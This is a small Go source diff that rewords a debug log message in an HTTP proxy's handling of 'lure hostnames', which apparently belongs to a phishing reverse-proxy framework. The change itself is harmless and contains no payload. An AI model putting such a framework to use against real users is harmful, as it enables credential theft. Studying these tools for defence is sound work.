@@ -639,7 +639,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
 				if p.cfg.IsLureHostnameValid(req.Host) {
-					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)
+					log.Debug("valid lure hostname: %s, but invalid lure path: %s", req.Host, req_path)
 
 					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
 					if resp != nil {
